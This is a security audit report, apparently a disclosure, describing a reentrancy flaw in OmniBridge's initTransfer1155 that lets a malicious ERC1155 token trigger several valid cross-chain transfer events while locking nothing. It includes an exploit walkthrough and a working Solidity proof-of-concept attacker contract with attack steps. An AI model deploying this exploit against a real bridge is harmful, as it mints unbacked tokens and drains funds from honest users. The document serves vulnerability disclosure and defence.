### Title
ERC1155 Callback Reentrancy in `initTransfer1155` Allows Unauthorized Multi-Minting on NEAR - (File: `evm/src/omni-bridge/contracts/OmniBridge.sol`)

---

### Summary

`initTransfer1155` in `OmniBridge.sol` calls the attacker-controlled `IERC1155.safeTransferFrom` before emitting the `InitTransfer` event and before `initTransferExtension` (which publishes the Wormhole VAA in `OmniBridgeWormhole`). There is no reentrancy guard anywhere in the EVM contracts. A malicious ERC1155 token can reenter `initTransfer1155` during `safeTransferFrom`, causing multiple `InitTransfer` events (and Wormhole VAAs) to be emitted with distinct, valid nonces — each of which the NEAR side will independently process and mint tokens for — while the attacker locks tokens only once (or not at all).

---

### Finding Description

**Root cause — violated CEI in `initTransfer1155`:** [1](#0-0) 

```
initTransfer1155():
  448: currentOriginNonce += 1;          ← nonce incremented (good)
  ...
  458: IERC1155(tokenAddress)             ← EXTERNAL CALL to attacker-controlled token
           .safeTransferFrom(msg.sender, address(this), tokenId, amount, "");
  ...
  468: initTransferExtension(...)         ← Wormhole VAA published here (post-call)
  480: emit BridgeTypes.InitTransfer(...) ← event emitted here (post-call)
```

The `currentOriginNonce` is incremented before the external call, but the `InitTransfer` event and `initTransferExtension` (which publishes the Wormhole VAA in `OmniBridgeWormhole`) are both executed **after** the external call to the attacker-controlled ERC1155 contract. [2](#0-1) 

**No reentrancy guard exists:**

A search for `nonReentrant` / `ReentrancyGuard` across all EVM production contracts returns zero matches. The only modifier on `initTransfer1155` is `whenNotPaused(PAUSED_INIT_TRANSFER)`.

**Why the `onERC1155Received` check does not prevent reentrancy:**

The bridge's `onERC1155Received` guard rejects transfers where `operator != address(this)`: [3](#0-2) 

This check only blocks *direct* ERC1155 sends to the bridge from external parties. It does **not** prevent the malicious token's `safeTransferFrom` implementation from calling `bridge.initTransfer1155(...)` directly as a reentrant call — that path never touches `onERC1155Received`.

**Exploit flow:**

1. Attacker deploys `MaliciousERC1155` whose `safeTransferFrom` reenters `bridge.initTransfer1155(...)` a fixed number of times `K`, then returns without actually transferring tokens.
2. Attacker calls `bridge.logMetadata1155(MaliciousERC1155, tokenId)` — permissionless, registers the token. NEAR side deploys a corresponding NEP-141 token.
3. Attacker calls `bridge.initTransfer1155(MaliciousERC1155, tokenId, amount, fee, nativeFee, recipient, message)`.
4. Bridge sets `currentOriginNonce = N`.
5. Bridge calls `MaliciousERC1155.safeTransferFrom(attacker, bridge, tokenId, amount, "")`.
6. Inside `safeTransferFrom`, the malicious token reenters `initTransfer1155` K times:
   - Each reentrant call increments `currentOriginNonce` to `N+1, N+2, ..., N+K`.
   - Each reentrant call (after the deepest level unwinds) calls `initTransferExtension` → publishes a Wormhole VAA with a unique `wormholeNonce`, then emits `InitTransfer` with its unique nonce.
7. Malicious token returns from `safeTransferFrom` without transferring any tokens.
8. Outer call calls `initTransferExtension` → publishes Wormhole VAA for nonce `N`, emits `InitTransfer` with nonce `N`.
9. NEAR side receives `K+1` distinct Wormhole VAAs (or light-client proofs), each with a unique `originNonce`. It processes all of them and mints `(K+1) × amount` NEP-141 tokens to the attacker's NEAR address.
10. Attacker has minted `(K+1) × amount` bridged tokens on NEAR while locking zero ERC1155 tokens on EVM. [4](#0-3) 

The `currentOriginNonce` is a plain `uint64` storage slot — each reentrant call reads the already-incremented value and increments it again, producing a fresh, collision-free nonce that the NEAR side has no reason to reject.

---

### Impact Explanation

**Critical.** An unprivileged attacker can mint an unbounded quantity of NEP-141 bridged tokens on NEAR with zero EVM-side collateral. Every `InitTransfer` event carries a unique `originNonce`, so the NEAR bridge's replay-protection does not filter them. The minted tokens are indistinguishable from legitimately bridged tokens and can be used to drain liquidity pools, swap for real assets, or bridge back — permanently destroying the 1:1 backing invariant and causing direct loss of funds to honest users who hold or redeem the same bridged token.

The `OmniBridgeWormhole` deployment (used for Solana, BNB, Arbitrum, Base, Polygon flows) is the primary affected path because `initTransferExtension` publishes a Wormhole VAA that the NEAR side accepts as authoritative proof. The base `OmniBridge` deployment (light-client path for Ethereum) is equally affected because the `InitTransfer` event is what the NEAR light-client prover reads. [5](#0-4) 

The documented invariant "Always mutate state (e.g. mark nonce used) before any external call" is violated specifically for `initTransfer1155`.

---

### Likelihood Explanation

**High.** The entry point is fully permissionless — any address can deploy an ERC1155 contract and call `initTransfer1155`. No privileged role, no leaked key, and no external dependency is required. `logMetadata1155` is also permissionless, so the attacker can register their token without admin involvement. The attack requires only deploying two contracts (malicious ERC1155 + optional NEAR recipient) and one transaction.

---

### Recommendation

Apply the CEI pattern strictly in `initTransfer1155`: move `initTransferExtension` and `emit BridgeTypes.InitTransfer` to execute **before** the `safeTransferFrom` call, or — since the nonce must be captured before the event — snapshot `currentOriginNonce` into a local variable, emit the event and publish the VAA using that snapshot, and only then call `safeTransferFrom`. Additionally, add OpenZeppelin's `ReentrancyGuardUpgradeable` (`nonReentrant` modifier) to both `initTransfer` and `initTransfer1155` as defense-in-depth, consistent with the stated security invariant in `evm/CLAUDE.md`.

---

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {IERC1155} from "@openzeppelin/contracts/token/ERC1155/IERC1155.sol";

interface IBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IBridge public bridge;
    uint256 public reentrancyCount;
    uint256 public maxReentrancy = 5; // drain 6x tokens for 1x lock

    constructor(address _bridge) {
        bridge = IBridge(_bridge);
    }

    // Called by bridge: IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), ...)
    function safeTransferFrom(
        address from,
        address to,
        uint256 id,
        uint256 amount,
        bytes calldata
    ) external {
        if (reentrancyCount < maxReentrancy) {
            reentrancyCount++;
            // Reenter initTransfer1155 — bridge increments nonce again,
            // publishes another Wormhole VAA, emits another InitTransfer
            bridge.initTransfer1155(address(this), id, uint128(amount), 0, 0, "attacker.near", "");
            reentrancyCount--;
        }
        // Do NOT actually transfer tokens — fake the lock
        // Bridge has no balance check after this call
    }

    // Satisfy ERC1155 interface minimally
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack:
// 1. Deploy MaliciousERC1155(bridge)
// 2. bridge.logMetadata1155(malicious, tokenId)  -- permissionless
// 3. bridge.initTransfer1155(malicious, tokenId, 1e18, 0, 0, "attacker.near", "")
//    → 6 InitTransfer events emitted (nonces N..N+5), 0 tokens locked
//    → NEAR side mints 6e18 NEP-141 tokens to attacker.near
```

### Citations

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L44-45)
```text
    mapping(uint64 => bool) public completedTransfers;
    uint64 public currentOriginNonce;
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L447-490)
```text
    ) external payable whenNotPaused(PAUSED_INIT_TRANSFER) {
        currentOriginNonce += 1;
        if (fee >= amount) {
            revert InvalidFee();
        }

        address deterministicToken = deriveDeterministicAddress(
            tokenAddress,
            tokenId
        );

        IERC1155(tokenAddress).safeTransferFrom(
            msg.sender,
            address(this),
            tokenId,
            amount,
            ""
        );

        uint256 extensionValue = msg.value - nativeFee;

        initTransferExtension(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message,
            extensionValue
        );

        emit BridgeTypes.InitTransfer(
            msg.sender,
            deterministicToken,
            currentOriginNonce,
            amount,
            fee,
            nativeFee,
            recipient,
            message
        );
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridge.sol (L522-535)
```text
    function onERC1155Received(
        address operator,
        address,
        uint256,
        uint256,
        bytes calldata
    ) external view override returns (bytes4) {
        // Only accept transfers that were initiated by this contract itself
        if (operator != address(this)) {
            revert ERC1155DirectSendNotAllowed();
        }

        return this.onERC1155Received.selector;
    }
```

**File:** evm/src/omni-bridge/contracts/OmniBridgeWormhole.sol (L118-150)
```text
    function initTransferExtension(
        address sender,
        address tokenAddress,
        uint64 originNonce,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message,
        uint256 value
    ) internal override {
        bytes memory payload = bytes.concat(
            bytes1(uint8(MessageType.InitTransfer)),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(sender),
            bytes1(omniBridgeChainId),
            Borsh.encodeAddress(tokenAddress),
            Borsh.encodeUint64(originNonce),
            Borsh.encodeUint128(amount),
            Borsh.encodeUint128(fee),
            Borsh.encodeUint128(nativeFee),
            Borsh.encodeString(recipient),
            Borsh.encodeString(message)
        );
        // slither-disable-next-line reentrancy-eth
        _wormhole.publishMessage{value: value}(
            wormholeNonce,
            payload,
            _consistencyLevel
        );

        wormholeNonce++;
    }
```

**File:** evm/CLAUDE.md (L34-34)
```markdown
- **State before external calls**: Always mutate state (e.g. mark nonce used) before any external call (token transfer, ETH send, custom minter). This is the primary reentrancy defense
```
